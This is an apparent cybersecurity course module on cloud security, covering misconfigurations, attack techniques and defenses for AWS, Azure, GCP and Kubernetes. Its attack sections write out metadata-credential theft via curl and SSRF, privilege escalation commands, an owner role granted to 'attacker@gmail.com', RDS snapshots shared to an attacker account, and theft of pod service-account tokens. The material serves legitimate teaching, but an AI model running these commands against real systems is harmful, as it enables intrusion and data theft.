# Stage 13: Cloud Security and Attacks

## Overview

**Duration:** 30-40 hours  
**Difficulty:** Intermediate to Advanced  
**Prerequisites:** Stage 1-10, Basic understanding of cloud platforms

This stage covers cloud computing security fundamentals, common vulnerabilities in cloud environments, attack techniques, and defense strategies across major cloud providers (AWS, Azure, GCP).

---

## Learning Objectives

By the end of this stage, you will be able to:

1. Understand cloud computing models and shared responsibility
2. Identify common cloud misconfigurations and vulnerabilities
3. Perform cloud security assessments and penetration testing
4. Exploit common cloud security weaknesses (in authorized environments)
5. Implement cloud security best practices
6. Use cloud-native security tools and services
7. Respond to cloud security incidents

---

## Module 13.1: Cloud Computing Fundamentals (4-5 hours)

### 13.1.1 Cloud Service Models

```
CLOUD SERVICE MODELS:
═════════════════════

┌─────────────────────────────────────────────────────────────────────────┐
│                                                                         │
│   ON-PREMISES        IaaS           PaaS           SaaS                 │
│   ────────────      ─────          ─────          ─────                 │
│                                                                         │
│   ┌───────────┐   ┌───────────┐   ┌───────────┐   ┌───────────┐        │
│   │Applications│   │Applications│   │Applications│   │Applications│  CSP  │
│   ├───────────┤   ├───────────┤   ├───────────┤   ├───────────┤        │
│   │   Data    │   │   Data    │   │   Data    │   │   Data    │  Mgd   │
│   ├───────────┤   ├───────────┤   ├───────────┤   ├───────────┤        │
│   │  Runtime  │   │  Runtime  │   │  Runtime  │   │  Runtime  │   ▲    │
│   ├───────────┤   ├───────────┤   ├───────────┤   ├───────────┤   │    │
│   │Middleware │   │Middleware │   │Middleware │   │Middleware │   │    │
│   ├───────────┤   ├───────────┤   ├───────────┤   ├───────────┤        │
│   │    O/S    │   │    O/S    │   │    O/S    │   │    O/S    │        │
│   ├───────────┤   ├───────────┤   ├───────────┤   ├───────────┤        │
│   │Virtualizn │   │Virtualizn │   │Virtualizn │   │Virtualizn │   │    │
│   ├───────────┤   ├───────────┤   ├───────────┤   ├───────────┤   │    │
│   │  Servers  │   │  Servers  │   │  Servers  │   │  Servers  │   ▼    │
│   ├───────────┤   ├───────────┤   ├───────────┤   ├───────────┤  Cust  │
│   │  Storage  │   │  Storage  │   │  Storage  │   │  Storage  │  Mgd   │
│   ├───────────┤   ├───────────┤   ├───────────┤   ├───────────┤        │
│   │ Networking│   │ Networking│   │ Networking│   │ Networking│        │
│   └───────────┘   └───────────┘   └───────────┘   └───────────┘        │
│        YOU            YOU             YOU             YOU               │
│       MANAGE      ◄─MANAGE─▶      ◄─MANAGE─▶       MANAGE              │
│        ALL          TOP 3          TOP 2         DATA ONLY             │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘

EXAMPLES:
─────────
• IaaS: AWS EC2, Azure VMs, Google Compute Engine
• PaaS: AWS Elastic Beanstalk, Azure App Service, Google App Engine
• SaaS: Microsoft 365, Salesforce, Gmail
```

### 13.1.2 Shared Responsibility Model

```python
#!/usr/bin/env python3
"""
shared_responsibility.py - Cloud shared responsibility model
"""

SHARED_RESPONSIBILITY = """
SHARED RESPONSIBILITY MODEL:
════════════════════════════

                    CUSTOMER RESPONSIBILITY
                    ───────────────────────
                           │
    ┌──────────────────────┼──────────────────────┐
    │                      │                      │
    │   ┌──────────────────▼──────────────────┐   │
    │   │  CUSTOMER DATA                      │   │
    │   │  • Data classification              │   │
    │   │  • Encryption                       │   │
    │   │  • Backup                           │   │
    │   └─────────────────────────────────────┘   │
    │                                             │
    │   ┌─────────────────────────────────────┐   │
    │   │  IDENTITY & ACCESS MANAGEMENT       │   │
    │   │  • User accounts                    │   │
    │   │  • MFA                              │   │
    │   │  • Permissions                      │   │
    │   └─────────────────────────────────────┘   │
    │                                             │
    │   ┌─────────────────────────────────────┐   │
    │   │  APPLICATION & PLATFORM             │   │
    │   │  • OS patching (IaaS)               │   │
    │   │  • Application security             │   │
    │   │  • Network configuration            │   │
    │   └─────────────────────────────────────┘   │
    │                                             │
    └─────────────────────────────────────────────┘
    
════════════════════════════════════════════════════
    
    ┌─────────────────────────────────────────────┐
    │                                             │
    │   ┌─────────────────────────────────────┐   │
    │   │  PHYSICAL SECURITY                  │   │
    │   │  • Data centers                     │   │
    │   │  • Hardware                         │   │
    │   └─────────────────────────────────────┘   │
    │                                             │
    │   ┌─────────────────────────────────────┐   │
    │   │  NETWORK INFRASTRUCTURE             │   │
    │   │  • Global network                   │   │
    │   │  • Edge locations                   │   │
    │   └─────────────────────────────────────┘   │
    │                                             │
    │   ┌─────────────────────────────────────┐   │
    │   │  VIRTUALIZATION                     │   │
    │   │  • Hypervisor                       │   │
    │   │  • Instance isolation               │   │
    │   └─────────────────────────────────────┘   │
    │                                             │
    │   ┌─────────────────────────────────────┐   │
    │   │  MANAGED SERVICES                   │   │
    │   │  • Patching (PaaS/SaaS)             │   │
    │   │  • Availability                     │   │
    │   └─────────────────────────────────────┘   │
    │                                             │
    └──────────────────────┬──────────────────────┘
                           │
                    CSP RESPONSIBILITY
                    ──────────────────
"""

print(SHARED_RESPONSIBILITY)
```

### 13.1.3 Major Cloud Providers

```
MAJOR CLOUD PROVIDERS COMPARISON:
═════════════════════════════════

┌────────────────┬─────────────────┬─────────────────┬─────────────────┐
│    Service     │      AWS        │     Azure       │      GCP        │
├────────────────┼─────────────────┼─────────────────┼─────────────────┤
│ Compute        │ EC2             │ Virtual Machines│ Compute Engine  │
│ Serverless     │ Lambda          │ Functions       │ Cloud Functions │
│ Containers     │ ECS/EKS         │ AKS             │ GKE             │
│ Storage        │ S3              │ Blob Storage    │ Cloud Storage   │
│ Database       │ RDS/DynamoDB    │ SQL Database    │ Cloud SQL       │
│ IAM            │ IAM             │ Azure AD        │ Cloud IAM       │
│ Networking     │ VPC             │ VNet            │ VPC             │
│ Secrets        │ Secrets Manager │ Key Vault       │ Secret Manager  │
│ Logging        │ CloudTrail      │ Activity Log    │ Cloud Audit     │
│ Security       │ GuardDuty       │ Sentinel        │ Security Command│
└────────────────┴─────────────────┴─────────────────┴─────────────────┘
```

---

## Module 13.2: Cloud Misconfigurations (6-7 hours)

### 13.2.1 Storage Misconfigurations

```python
#!/usr/bin/env python3
"""
storage_security.py - Cloud storage security issues
"""

S3_MISCONFIGURATIONS = """
AWS S3 BUCKET MISCONFIGURATIONS:
════════════════════════════════

COMMON ISSUES:
──────────────

1. PUBLIC BUCKET ACCESS
   ─────────────────────
   Risk: Anyone can list/read bucket contents
   
   # Check if bucket is public
   aws s3 ls s3://bucket-name --no-sign-request
   
   # Check bucket ACL
   aws s3api get-bucket-acl --bucket bucket-name
   
   # Check bucket policy
   aws s3api get-bucket-policy --bucket bucket-name

2. OVERLY PERMISSIVE POLICIES
   ───────────────────────────
   Bad Policy Example:
   {
     "Effect": "Allow",
     "Principal": "*",
     "Action": "s3:*",
     "Resource": "arn:aws:s3:::bucket-name/*"
   }

3. DISABLED ENCRYPTION
   ────────────────────
   # Check encryption status
   aws s3api get-bucket-encryption --bucket bucket-name
   
4. NO VERSIONING/LOGGING
   ──────────────────────
   # Check versioning
   aws s3api get-bucket-versioning --bucket bucket-name
   
   # Check logging
   aws s3api get-bucket-logging --bucket bucket-name

5. EXPOSED SENSITIVE DATA
   ───────────────────────
   • Credentials in code repositories
   • Database backups
   • Log files with PII
   • Configuration files
"""

AZURE_BLOB = """
AZURE BLOB STORAGE ISSUES:
══════════════════════════

COMMON MISCONFIGURATIONS:
─────────────────────────

1. PUBLIC CONTAINER ACCESS
   ────────────────────────
   Access Levels:
   • Private (default, secure)
   • Blob (anonymous read for blobs)
   • Container (anonymous read + list)
   
   # Check with Azure CLI
   az storage container show-permission \\
     --account-name storageaccount \\
     --name container

2. SHARED ACCESS SIGNATURES (SAS)
   ───────────────────────────────
   Issues:
   • Overly long validity periods
   • Excessive permissions
   • Not using stored access policies
   
3. STORAGE ACCOUNT KEYS
   ─────────────────────
   • Keys provide full access
   • Should use Azure AD instead
   • Rotate keys regularly
"""

GCP_STORAGE = """
GCP CLOUD STORAGE ISSUES:
═════════════════════════

MISCONFIGURATION TYPES:
───────────────────────

1. PUBLIC BUCKETS
   ───────────────
   # Check ACL
   gsutil iam get gs://bucket-name
   
   # Public indicators:
   • allUsers - Anyone on internet
   • allAuthenticatedUsers - Any Google account

2. UNIFORM BUCKET-LEVEL ACCESS
   ────────────────────────────
   # If disabled, ACLs can override IAM
   # Always enable for consistent permissions

3. SIGNED URLs
   ────────────
   • Check expiration times
   • Limit permissions granted
   • Log URL generation
"""

print(S3_MISCONFIGURATIONS)
```

### 13.2.2 IAM Misconfigurations

```python
#!/usr/bin/env python3
"""
iam_security.py - Cloud IAM security issues
"""

IAM_ISSUES = """
CLOUD IAM MISCONFIGURATIONS:
════════════════════════════

AWS IAM ISSUES:
───────────────

1. OVERLY PERMISSIVE POLICIES
   ───────────────────────────
   BAD: 
   {
     "Effect": "Allow",
     "Action": "*",
     "Resource": "*"
   }
   
   BETTER:
   {
     "Effect": "Allow",
     "Action": ["s3:GetObject", "s3:PutObject"],
     "Resource": "arn:aws:s3:::specific-bucket/*"
   }

2. UNUSED CREDENTIALS
   ───────────────────
   # Find unused access keys
   aws iam list-users --query 'Users[*].UserName' | \\
   xargs -I {} aws iam list-access-keys --user-name {}
   
   # Check last used
   aws iam get-access-key-last-used --access-key-id AKIAXXXXXXX

3. NO MFA FOR PRIVILEGED USERS
   ────────────────────────────
   # Check MFA status
   aws iam list-virtual-mfa-devices
   
   # Enforce MFA in policy
   "Condition": {"Bool": {"aws:MultiFactorAuthPresent": "true"}}

4. ROOT ACCOUNT USAGE
   ───────────────────
   • Never use root for daily tasks
   • Enable MFA on root
   • Monitor root activity

5. CROSS-ACCOUNT ACCESS
   ─────────────────────
   • Review trust relationships
   • Limit external ID usage
   • Audit AssumeRole permissions

AZURE AD ISSUES:
────────────────

1. EXCESSIVE GLOBAL ADMIN
   ───────────────────────
   • Minimize Global Administrators
   • Use Privileged Identity Management (PIM)
   • Just-in-time access

2. LEGACY AUTHENTICATION
   ──────────────────────
   • Block legacy auth protocols
   • Require modern auth

3. CONDITIONAL ACCESS GAPS
   ────────────────────────
   • Missing geo-restrictions
   • No device compliance checks
   • Weak MFA policies

GCP IAM ISSUES:
───────────────

1. PRIMITIVE ROLES
   ────────────────
   Avoid: Owner, Editor, Viewer
   Use: Specific predefined roles

2. SERVICE ACCOUNT KEYS
   ─────────────────────
   • Avoid creating user-managed keys
   • Use Workload Identity instead
   • Short key lifetimes
"""

IAM_ENUMERATION = """
IAM ENUMERATION TECHNIQUES:
═══════════════════════════

AWS:
────
# List users
aws iam list-users

# List roles
aws iam list-roles

# Get attached policies
aws iam list-attached-user-policies --user-name USER

# Get inline policies
aws iam list-user-policies --user-name USER

# Enumerate permissions (with enumerate-iam tool)
python3 enumerate-iam.py --access-key AKIA... --secret-key ...

AZURE:
──────
# List users
az ad user list

# List groups
az ad group list

# List service principals
az ad sp list

# List role assignments
az role assignment list

GCP:
────
# List IAM policy
gcloud projects get-iam-policy PROJECT_ID

# List service accounts
gcloud iam service-accounts list

# Test permissions
gcloud projects get-iam-policy PROJECT_ID \\
  --flatten="bindings[].members" \\
  --filter="bindings.members:user:email@example.com"
"""

print(IAM_ISSUES)
print(IAM_ENUMERATION)
```

### 13.2.3 Network Misconfigurations

```python
#!/usr/bin/env python3
"""
cloud_network_security.py - Cloud network security issues
"""

NETWORK_ISSUES = """
CLOUD NETWORK MISCONFIGURATIONS:
════════════════════════════════

AWS VPC/SECURITY GROUPS:
────────────────────────

1. OVERLY PERMISSIVE SECURITY GROUPS
   ──────────────────────────────────
   # Find groups with 0.0.0.0/0 ingress
   aws ec2 describe-security-groups \\
     --query 'SecurityGroups[?IpPermissions[?contains(IpRanges[].CidrIp, `0.0.0.0/0`)]]'
   
   Critical ports open to internet:
   • 22 (SSH) - Should be restricted
   • 3389 (RDP) - Should be restricted
   • 3306 (MySQL) - Should never be public
   • 5432 (PostgreSQL) - Should never be public
   • 27017 (MongoDB) - Should never be public

2. PUBLIC SUBNETS
   ───────────────
   • Resources directly internet-accessible
   • Should use private subnets + NAT/bastion

3. NACL MISCONFIGURATIONS
   ───────────────────────
   • Too permissive outbound rules
   • Default NACL allows all

4. VPC PEERING/ENDPOINTS
   ──────────────────────
   • Overly permissive peering
   • Missing VPC endpoints for AWS services

AZURE NETWORK SECURITY:
───────────────────────

1. NETWORK SECURITY GROUPS (NSG)
   ──────────────────────────────
   # List NSGs with Any source
   az network nsg list --query "[].securityRules[?sourceAddressPrefix=='*']"
   
2. PUBLIC IP ASSIGNMENT
   ─────────────────────
   • VMs with public IPs
   • Should use Azure Bastion or VPN

3. SERVICE ENDPOINTS
   ──────────────────
   • Missing for Azure services
   • Data traverses public internet

GCP NETWORK SECURITY:
─────────────────────

1. FIREWALL RULES
   ───────────────
   # Find rules with 0.0.0.0/0 source
   gcloud compute firewall-rules list \\
     --filter="sourceRanges:(0.0.0.0/0)"
   
2. DEFAULT NETWORK
   ────────────────
   • Has permissive default rules
   • Should create custom VPC

3. PRIVATE GOOGLE ACCESS
   ──────────────────────
   • Should be enabled for internal access to Google APIs
"""

print(NETWORK_ISSUES)
```

---

## Module 13.3: Cloud Attack Techniques (8-10 hours)

### 13.3.1 Initial Access

```python
#!/usr/bin/env python3
"""
cloud_initial_access.py - Cloud initial access techniques
"""

INITIAL_ACCESS = """
CLOUD INITIAL ACCESS VECTORS:
═════════════════════════════

1. STOLEN CREDENTIALS
   ───────────────────
   Sources:
   • Phishing
   • Credential stuffing
   • Malware
   • Code repositories (hardcoded)
   • Exposed .env files
   • Public S3 buckets
   • Leaked databases
   
   # Check for AWS keys in git history
   git log -p | grep -E 'AKIA[0-9A-Z]{16}'
   
   # Tools: trufflehog, gitleaks, git-secrets

2. EXPOSED METADATA SERVICES
   ──────────────────────────
   AWS:
   curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
   
   Azure:
   curl -H "Metadata:true" \\
     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
   
   GCP:
   curl -H "Metadata-Flavor: Google" \\
     "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
   
   Defense: IMDSv2 (AWS), Private endpoints

3. SSRF TO CLOUD METADATA
   ───────────────────────
   # Exploit vulnerable web app
   GET /?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
   
   # Extract temporary credentials
   {
     "AccessKeyId": "ASIAXXX...",
     "SecretAccessKey": "xxx...",
     "Token": "xxx...",
     "Expiration": "2024-01-01T00:00:00Z"
   }

4. EXPLOITING VULNERABLE APPLICATIONS
   ───────────────────────────────────
   • Web application vulnerabilities
   • Exposed management interfaces
   • Default credentials on cloud services
   • Vulnerable Lambda functions
   • Container escape

5. SOCIAL ENGINEERING
   ───────────────────
   • Phishing for cloud console access
   • OAuth phishing (consent grant attacks)
   • Supply chain attacks
"""

CREDENTIAL_DISCOVERY = """
FINDING CLOUD CREDENTIALS:
══════════════════════════

COMMON LOCATIONS:
─────────────────
~/.aws/credentials              # AWS CLI
~/.aws/config                   # AWS config
~/.azure/                       # Azure CLI
~/.config/gcloud/               # GCP CLI
.env files                      # Environment variables
terraform.tfstate               # Terraform state
*.tfvars                        # Terraform variables
docker-compose.yml              # Docker configs
kubernetes secrets              # K8s secrets

CODE REPOSITORY SCANNING:
─────────────────────────
# Using trufflehog
trufflehog git https://github.com/org/repo

# Using gitleaks  
gitleaks detect --source=/path/to/repo

# AWS key pattern
AKIA[0-9A-Z]{16}

# Azure patterns
"client_id"\\s*:\\s*"[a-f0-9-]{36}"
"client_secret"\\s*:\\s*"[^"]+"

# GCP patterns
"private_key_id"\\s*:\\s*"[a-f0-9]{40}"
"""

print(INITIAL_ACCESS)
print(CREDENTIAL_DISCOVERY)
```

### 13.3.2 Privilege Escalation

```python
#!/usr/bin/env python3
"""
cloud_privesc.py - Cloud privilege escalation techniques
"""

AWS_PRIVESC = """
AWS PRIVILEGE ESCALATION:
═════════════════════════

1. IAM POLICY MANIPULATION
   ────────────────────────
   # If you can attach policies to your user
   aws iam attach-user-policy \\
     --user-name compromised-user \\
     --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
   
   # If you can put inline policy
   aws iam put-user-policy \\
     --user-name compromised-user \\
     --policy-name escalation \\
     --policy-document file://admin-policy.json

2. ROLE CHAINING
   ──────────────
   # Assume role with more privileges
   aws sts assume-role \\
     --role-arn arn:aws:iam::123456789012:role/PrivilegedRole \\
     --role-session-name escalation

3. LAMBDA EXECUTION
   ─────────────────
   # Create Lambda with privileged role
   # Lambda assumes more privileged execution role
   
4. EC2 INSTANCE PROFILE
   ─────────────────────
   # If you can modify instance profile
   # Attach privileged role to instance

5. PASS ROLE
   ──────────
   # iam:PassRole allows assigning roles to resources
   # Create EC2/Lambda with privileged role

6. PERMISSIONS BOUNDARY BYPASS
   ────────────────────────────
   # Some permissions may not be bounded
   # Check for gaps in boundary policies

TOOLS:
──────
• Pacu - AWS exploitation framework
• PMapper - IAM privilege escalation paths
• Cloudsplaining - IAM security assessment
"""

AZURE_PRIVESC = """
AZURE PRIVILEGE ESCALATION:
═══════════════════════════

1. ROLE ASSIGNMENT
   ────────────────
   # If you can assign roles
   az role assignment create \\
     --assignee user@domain.com \\
     --role "Owner" \\
     --scope /subscriptions/xxx

2. MANAGED IDENTITY ABUSE
   ───────────────────────
   # Compromise VM with managed identity
   # Use identity to access other resources
   
3. SERVICE PRINCIPAL ABUSE
   ────────────────────────
   # Add credentials to existing SP
   az ad sp credential reset --name "AppName"
   
4. AZURE AD ABUSE
   ───────────────
   • Application Administrator → add creds to any app
   • Cloud Application Administrator
   • Privileged Role Administrator

5. AUTOMATION ACCOUNT
   ───────────────────
   # Run As account has subscription access
   # Runbooks can execute privileged operations

TOOLS:
──────
• AzureHound - BloodHound for Azure
• ROADtools - Azure AD exploration
• PowerZure - Azure security toolkit
"""

GCP_PRIVESC = """
GCP PRIVILEGE ESCALATION:
═════════════════════════

1. SERVICE ACCOUNT KEY CREATION
   ─────────────────────────────
   # If you have iam.serviceAccountKeys.create
   gcloud iam service-accounts keys create key.json \\
     --iam-account=sa@project.iam.gserviceaccount.com

2. SERVICE ACCOUNT IMPERSONATION
   ──────────────────────────────
   # If you have iam.serviceAccounts.getAccessToken
   gcloud auth print-access-token \\
     --impersonate-service-account=sa@project.iam.gserviceaccount.com

3. setIamPolicy ABUSE
   ───────────────────
   # Grant yourself or others additional roles
   gcloud projects add-iam-policy-binding PROJECT \\
     --member="user:attacker@gmail.com" \\
     --role="roles/owner"

4. COMPUTE INSTANCE SA
   ────────────────────
   # VMs often have attached service accounts
   # Compromise VM to use SA credentials

5. CLOUD FUNCTION ABUSE
   ─────────────────────
   # Functions run with service account
   # Deploy function to execute privileged ops

TOOLS:
──────
• GCP-IAM-Privilege-Escalation tool
• gcphound
"""

print(AWS_PRIVESC)
print(AZURE_PRIVESC)
print(GCP_PRIVESC)
```

### 13.3.3 Lateral Movement and Data Access

```python
#!/usr/bin/env python3
"""
cloud_lateral.py - Cloud lateral movement techniques
"""

LATERAL_MOVEMENT = """
CLOUD LATERAL MOVEMENT:
═══════════════════════

AWS LATERAL MOVEMENT:
─────────────────────

1. CROSS-ACCOUNT ACCESS
   ─────────────────────
   # Use assumed role to access other accounts
   aws sts assume-role \\
     --role-arn arn:aws:iam::TARGET_ACCOUNT:role/RoleName \\
     --role-session-name lateral
   
2. VPC PEERING EXPLOITATION
   ─────────────────────────
   # Access resources in peered VPCs
   # Often have different security controls

3. SSM SESSION MANAGER
   ────────────────────
   # If you have ssm:StartSession
   aws ssm start-session --target i-xxxxxxxxx

4. SECRETS MANAGER/PARAMETER STORE
   ─────────────────────────────────
   # Retrieve credentials for other systems
   aws secretsmanager get-secret-value --secret-id MySecret
   aws ssm get-parameter --name /prod/db/password --with-decryption

5. SHARED SERVICES
   ────────────────
   • Shared S3 buckets
   • Shared databases
   • Transit Gateway access

AZURE LATERAL MOVEMENT:
───────────────────────

1. SUBSCRIPTION HOPPING
   ─────────────────────
   # Check access to other subscriptions
   az account list
   az account set -s "Other Subscription"

2. AZURE AD ACCESS
   ────────────────
   # Access Azure AD with sufficient permissions
   az ad user list
   az ad group list

3. KEY VAULT ACCESS
   ─────────────────
   # Retrieve secrets from Key Vault
   az keyvault secret list --vault-name MyVault
   az keyvault secret show --vault-name MyVault --name MySecret

4. VIRTUAL NETWORK ACCESS
   ───────────────────────
   # Access VMs in connected VNets
   # Peered networks, VPN gateways

GCP LATERAL MOVEMENT:
─────────────────────

1. PROJECT ENUMERATION
   ────────────────────
   # List accessible projects
   gcloud projects list
   
2. ORGANIZATION ACCESS
   ────────────────────
   # Check organization-level access
   gcloud organizations list
   
3. SHARED VPC
   ───────────
   # Access resources in shared VPC projects

4. SECRET MANAGER
   ───────────────
   gcloud secrets list
   gcloud secrets versions access latest --secret=my-secret
"""

DATA_EXFILTRATION = """
DATA EXFILTRATION TECHNIQUES:
═════════════════════════════

STORAGE ACCESS:
───────────────
# AWS S3
aws s3 sync s3://bucket-name ./local-dir

# Azure Blob
az storage blob download-batch -d ./local -s container-name

# GCP Storage
gsutil cp -r gs://bucket-name ./local-dir

DATABASE ACCESS:
────────────────
# AWS RDS snapshot sharing
aws rds modify-db-snapshot-attribute \\
  --db-snapshot-identifier mydbsnapshot \\
  --attribute-name restore \\
  --values-to-add attacker-account-id

# Copy data via snapshot
aws rds create-db-snapshot \\
  --db-instance-identifier mydb \\
  --db-snapshot-identifier exfil-snapshot

COVERT CHANNELS:
────────────────
• DNS exfiltration via Route53
• S3 pre-signed URLs
• Lambda to external endpoints
• SQS/SNS to external accounts
"""

print(LATERAL_MOVEMENT)
print(DATA_EXFILTRATION)
```

---

## Module 13.4: Container and Kubernetes Security (5-6 hours)

### 13.4.1 Container Security

```python
#!/usr/bin/env python3
"""
container_security.py - Container security concepts
"""

CONTAINER_RISKS = """
CONTAINER SECURITY RISKS:
═════════════════════════

1. VULNERABLE BASE IMAGES
   ───────────────────────
   # Scan for vulnerabilities
   trivy image myimage:latest
   grype myimage:latest
   
   Best practices:
   • Use minimal base images (distroless, Alpine)
   • Keep images updated
   • Scan in CI/CD pipeline

2. CONTAINER ESCAPE
   ─────────────────
   Vectors:
   • Privileged containers
   • Mounted host paths
   • Kernel exploits
   • Docker socket access
   
   # Check for privileged mode
   docker inspect --format='{{.HostConfig.Privileged}}' container

3. IMAGE SUPPLY CHAIN
   ───────────────────
   • Malicious public images
   • Typosquatting
   • Compromised registries
   
   Defense:
   • Use private registries
   • Sign and verify images
   • Scan before deployment

4. SECRETS IN IMAGES
   ──────────────────
   # Scan for secrets in layers
   dive myimage:latest
   
   # Never include:
   • Credentials
   • API keys
   • Private keys

5. RUNTIME SECURITY
   ─────────────────
   • Run as non-root
   • Read-only filesystem
   • Drop capabilities
   • Seccomp/AppArmor profiles
"""

DOCKERFILE_SECURITY = """
SECURE DOCKERFILE PRACTICES:
════════════════════════════

# BAD
FROM ubuntu:latest
RUN apt-get update && apt-get install -y everything
COPY . /app
RUN chmod 777 /app
CMD ["./app"]

# GOOD
FROM python:3.11-slim AS base

# Create non-root user
RUN groupadd -r appgroup && useradd -r -g appgroup appuser

# Set working directory
WORKDIR /app

# Copy requirements first (layer caching)
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Copy application
COPY --chown=appuser:appgroup . .

# Drop to non-root user
USER appuser

# Use specific entrypoint
ENTRYPOINT ["python", "app.py"]

# SECURITY BEST PRACTICES:
# ─────────────────────────
# 1. Use specific image tags, not :latest
# 2. Multi-stage builds to reduce attack surface
# 3. Non-root user
# 4. Minimal installed packages
# 5. No secrets in image
# 6. Read-only where possible
# 7. Health checks
"""

print(CONTAINER_RISKS)
print(DOCKERFILE_SECURITY)
```

### 13.4.2 Kubernetes Security

```python
#!/usr/bin/env python3
"""
kubernetes_security.py - Kubernetes security concepts
"""

K8S_ATTACK_SURFACE = """
KUBERNETES ATTACK SURFACE:
══════════════════════════

┌─────────────────────────────────────────────────────────────────────────┐
│                          KUBERNETES CLUSTER                             │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   CONTROL PLANE                                NODES                    │
│   ─────────────                               ─────                     │
│   ┌─────────────┐                        ┌─────────────┐                │
│   │ API Server  │◄──────────────────────▶│   kubelet   │                │
│   │ (kube-api)  │                        └─────────────┘                │
│   └─────────────┘                              │                        │
│         │                                      │                        │
│   ┌─────────────┐                        ┌─────▼─────┐                  │
│   │    etcd     │                        │    Pod    │                  │
│   │ (secrets!)  │                        │ ┌───────┐ │                  │
│   └─────────────┘                        │ │ App   │ │                  │
│         │                                │ └───────┘ │                  │
│   ┌─────────────┐                        └───────────┘                  │
│   │ Controller  │                                                       │
│   │  Manager    │                                                       │
│   └─────────────┘                                                       │
│                                                                         │
│   ATTACK VECTORS:                                                       │
│   • Exposed API server                                                  │
│   • Unencrypted etcd                                                    │
│   • Kubelet API                                                         │
│   • Pod escape to node                                                  │
│   • RBAC misconfigurations                                              │
│   • Secrets in environment variables                                    │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
"""

K8S_MISCONFIGURATIONS = """
KUBERNETES MISCONFIGURATIONS:
═════════════════════════════

1. PRIVILEGED PODS
   ────────────────
   # Check for privileged containers
   kubectl get pods -o json | jq '.items[].spec.containers[].securityContext.privileged'
   
   # Privileged pod = container escape risk

2. OVERPERMISSIVE RBAC
   ────────────────────
   # Check cluster-admin bindings
   kubectl get clusterrolebindings -o json | \\
     jq '.items[] | select(.roleRef.name=="cluster-admin")'
   
   # Dangerous permissions:
   • pods/exec
   • secrets (get, list)
   • * (wildcard)

3. EXPOSED SECRETS
   ────────────────
   # Secrets in environment variables (visible in pod spec)
   # Secrets mounted in containers
   
   kubectl get secrets
   kubectl get secret SECRET_NAME -o yaml

4. NO NETWORK POLICIES
   ────────────────────
   # All pods can communicate by default
   kubectl get networkpolicies -A
   
5. EXPOSED DASHBOARD
   ──────────────────
   # Kubernetes dashboard with skip login
   # ServiceAccount with cluster-admin

6. NO POD SECURITY
   ────────────────
   # No Pod Security Policies/Standards
   # Allow privileged, hostNetwork, hostPID

COMMON ATTACKS:
───────────────
• Get service account token from pod
• Use token to access API server
• Escalate via RBAC misconfiguration
• Access secrets
• Create privileged pod for escape
"""

K8S_ENUMERATION = """
KUBERNETES ENUMERATION:
═══════════════════════

FROM INSIDE A POD:
──────────────────
# Check for service account
ls -la /var/run/secrets/kubernetes.io/serviceaccount/

# Get token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)

# Get API server
APISERVER=https://kubernetes.default.svc

# Test API access
curl -s -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/namespaces

# Can we list secrets?
curl -s -k -H "Authorization: Bearer $TOKEN" $APISERVER/api/v1/secrets

# Can we create pods?
# Can we exec into other pods?

TOOLS:
──────
• kubectl (with stolen token)
• kubeletctl (for kubelet API)
• kube-hunter (security scanner)
• kubeaudit (configuration audit)
• Peirates (k8s pentest tool)
"""

print(K8S_ATTACK_SURFACE)
print(K8S_MISCONFIGURATIONS)
print(K8S_ENUMERATION)
```

---

## Module 13.5: Cloud Security Tools and Defense (5-6 hours)

### 13.5.1 Cloud Security Assessment Tools

```python
#!/usr/bin/env python3
"""
cloud_security_tools.py - Cloud security assessment tools
"""

ASSESSMENT_TOOLS = """
CLOUD SECURITY ASSESSMENT TOOLS:
════════════════════════════════

MULTI-CLOUD:
────────────
• Prowler      - AWS, Azure, GCP security best practices
• ScoutSuite   - Multi-cloud security auditing
• CloudSploit  - Cloud security configuration monitoring
• Steampipe    - SQL queries on cloud resources

AWS SPECIFIC:
─────────────
• Prowler      - Comprehensive AWS security checks
• Pacu         - AWS exploitation framework
• CloudMapper  - Network visualization
• aws-nuke     - Account cleanup (careful!)
• enumerate-iam - Permission enumeration
• PMapper      - IAM privilege escalation paths

AZURE SPECIFIC:
───────────────
• AzureHound   - BloodHound data collection
• ROADtools    - Azure AD toolkit
• PowerZure    - Security testing
• Azurite      - Azure AD audit

GCP SPECIFIC:
─────────────
• GCPBucketBrute - Bucket enumeration
• gcp-iam-privilege-escalation - PrivEsc paths
• Hayat        - GCP security scanner

CONTAINER/K8S:
──────────────
• Trivy        - Container vulnerability scanner
• kube-hunter  - Kubernetes penetration testing
• kubeaudit    - Configuration audit
• Falco        - Runtime security

COMMAND EXAMPLES:
─────────────────
# Prowler AWS scan
prowler aws -r us-east-1

# ScoutSuite multi-cloud
scout aws --profile default
scout azure --tenant-id xxx

# Trivy container scan
trivy image nginx:latest

# kube-hunter
kube-hunter --remote cluster.example.com
"""

print(ASSESSMENT_TOOLS)
```

### 13.5.2 Cloud Security Best Practices

```python
#!/usr/bin/env python3
"""
cloud_defense.py - Cloud security best practices
"""

SECURITY_CHECKLIST = """
CLOUD SECURITY CHECKLIST:
═════════════════════════

IDENTITY & ACCESS:
──────────────────
☐ Enable MFA for all users
☐ Use temporary credentials (roles, not keys)
☐ Implement least privilege
☐ Regular access reviews
☐ No root/admin for daily tasks
☐ Centralized identity (SSO)
☐ Strong password policies
☐ Monitor for anomalous logins

NETWORK SECURITY:
─────────────────
☐ Private subnets for resources
☐ No public IPs unless required
☐ Security groups with minimal access
☐ VPC flow logs enabled
☐ WAF for web applications
☐ DDoS protection
☐ VPN or PrivateLink for access

DATA PROTECTION:
────────────────
☐ Encryption at rest (all storage)
☐ Encryption in transit (TLS)
☐ Key management (HSM/KMS)
☐ No public storage buckets
☐ Data classification
☐ Backup and recovery tested

LOGGING & MONITORING:
─────────────────────
☐ CloudTrail/Activity Logs enabled
☐ Log aggregation (SIEM)
☐ Alerting on suspicious activity
☐ API call monitoring
☐ Resource change detection
☐ Incident response plan

COMPUTE SECURITY:
─────────────────
☐ Patching strategy
☐ Hardened images
☐ No exposed management ports
